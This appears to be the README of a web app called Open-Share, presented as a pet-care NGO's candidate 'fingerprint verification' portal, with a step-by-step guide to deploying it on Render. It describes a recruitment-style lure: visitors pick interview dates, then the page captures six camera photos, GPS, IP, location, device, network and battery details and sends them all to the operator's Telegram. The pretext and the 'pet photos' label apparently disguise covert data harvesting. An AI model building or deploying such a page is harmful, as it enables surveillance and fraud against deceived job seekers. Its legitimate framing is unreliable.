# 🐾 Open-Share

**Pet Care NGO - Digital Fingerprint Verification System**

A secure verification portal that collects digital fingerprint data from candidates and verifies it against their submitted resumes. Built with a sophisticated blended UI combining Neumorphism, Glassmorphism, and Skeuomorphism design styles.

---

## ✨ Features

### Frontend
- **Blended UI Design**: Neumorphism + Glassmorphism + Skeuomorphism
- **3D Background Animations**: Floating shapes and particles
- **Custom Date Selector**: Beautiful glassmorphic dropdown with interview dates
- **Camera Integration**: Automatic camera access with focus frames
- **6-Second Capture Sequence**: Takes 6 photos in pairs over 6 seconds
- **Real-time Progress**: Visual progress ring during capture
- **Data Extraction Animation**: Orbital animation while extracting device info
- **Success Animation**: Particle burst and checkmark celebration
- **Toast Notifications**: Non-intrusive feedback system
- **Responsive Design**: Works on mobile, tablet, and desktop
- **Font Awesome Icons**: Pure font-based icons (no emojis)
- **Professional Typography**: Playfair Display, Inter, Space Grotesk

### Backend
- **Express.js Server**: Robust Node.js backend
- **Telegram Integration**: Sends all data + photos to employer's Telegram
- **Security**: Helmet, CORS, Rate Limiting
- **File Upload**: Multer for image handling
- **UUID Tracking**: Each submission gets a unique ID

### Data Extracted
- IP Address (IPv4/IPv6)
- Approximate Location (City, State, Country)
- Browser Type
- Operating System
- Device Type
- Language
- GPS Location (with permission)
- Screen Resolution
- Camera Access (for pet photos)
- Network & Provider Info
- Battery Percentage & Status

---

## 🚀 Deployment on Render

### Step 1: Create a Render Account
1. Go to [render.com](https://render.com)
2. Sign up or log in

### Step 2: Create a New Web Service
1. Click "New +" → "Web Service"
2. Connect your GitHub repository or use "Deploy from Git URL"

### Step 3: Configure Environment Variables
Create a `.env` file (copy from `.env.example`):

```env
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
PORT=3000
NODE_ENV=production
SESSION_SECRET=your_random_session_secret_here
ALLOWED_ORIGINS=https://your-app.onrender.com
```

### Step 4: Set Up Telegram Bot
1. Message [@BotFather](https://t.me/botfather) on Telegram
2. Create a new bot: `/newbot`
3. Copy the bot token
4. Get your Chat ID:
   - Message [@userinfobot](https://t.me/userinfobot) to get your ID
   - Or use: `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`

### Step 5: Build Settings
- **Build Command**: `npm install`
- **Start Command**: `npm start`
- **Node Version**: `18` or higher

### Step 6: Deploy
Click "Create Web Service" and Render will automatically deploy your app!

---

## 📁 Project Structure

```
open-share/
├── server.js              # Main Express server
├── package.json           # Dependencies
├── .env.example           # Environment variables template
├── .env                   # Your actual environment variables (not in git)
├── README.md              # This file
└── public/
    ├── index.html         # Main HTML page
    ├── css/
    │   └── styles.css     # Blended UI styles
    └── js/
        └── app.js         # Frontend application logic
```

---

## 🎨 Design System

### Color Palette
- **Background**: `#e8e8e8` (Light Grey)
- **Primary Accent**: `#d4a843` (Deep Yellow)
- **Text Primary**: `#2c2c2c` (Dark Grey)
- **Glass Background**: `rgba(255, 255, 255, 0.25)`

### Typography
- **Display**: Playfair Display (serif)
- **Body**: Inter (sans-serif)
- **Mono**: Space Grotesk (monospace)

### Design Styles Blended
1. **Neumorphism**: Soft shadows, inset effects, 3D buttons
2. **Glassmorphism**: Frosted glass cards, backdrop blur
3. **Skeuomorphism**: Realistic textures, gradient buttons, embossed icons

---

## 🔒 Security Considerations

- All camera and GPS access requires explicit user permission
- HTTPS required for camera APIs in production
- Rate limiting prevents abuse (10 requests per 15 minutes)
- Helmet.js provides security headers
- Files are deleted after sending to Telegram
- No persistent storage of sensitive data

---

## 📱 Browser Compatibility

- **Chrome/Edge**: Full support
- **Firefox**: Full support
- **Safari**: Full support (iOS 14+ for camera)
- **Mobile Browsers**: Supported with responsive design

---

## 🛠️ Local Development

```bash
# Clone the repository
git clone <your-repo-url>
cd open-share

# Install dependencies
npm install

# Copy environment variables
cp .env.example .env
# Edit .env with your Telegram credentials

# Start development server
npm run dev
```

---

## 📝 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/dates` | GET | Get available interview dates |
| `/api/verify` | POST | Submit verification with data & photos |
| `/api/health` | GET | Health check |

---

## 📸 Camera Capture Flow

1. User clicks "Submit Verification"
2. Permission modal shows (Camera + GPS)
3. User clicks "Proceed"
4. Camera opens with focus frame overlay
5. 6-second countdown begins
6. Photos captured at: 1s, 2s, 3s, 4s, 5s, 6s
7. Camera closes, processing modal opens
8. Device data is extracted with orbital animation
9. All data + photos sent to Telegram
10. Success modal shows with 48-hour wait message

---

## 🐛 Troubleshooting

### Camera not working?
- Ensure you're on HTTPS (required for camera APIs)
- Check browser permissions
- Try using the fallback camera option

### Telegram not receiving messages?
- Verify bot token is correct
- Ensure you've started a conversation with the bot
- Check chat ID format (should be numeric)

### GPS not working?
- Requires HTTPS
- User must grant location permission
- Some browsers block geolocation on HTTP

---

## 📄 License

MIT License - Open-Share NGO

---

## 🤝 Support

For issues or questions, contact the organization or wait for your 48-hour confirmation period.

**Built with care for pet welfare** 🐾
